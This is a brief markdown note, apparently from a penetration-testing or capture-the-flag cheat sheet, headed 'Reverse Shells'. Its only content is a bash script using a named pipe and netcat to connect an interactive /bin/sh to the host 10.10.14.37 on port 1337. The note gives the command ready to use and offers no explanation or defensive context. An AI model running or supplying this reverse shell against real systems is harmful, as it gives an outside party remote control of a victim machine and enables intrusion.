# Reverse Shells
`bash`

```bash
#!/bin/bash
rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/sh -i 2>&1|nc 10.10.14.37 1337 >/tmp/wk
```
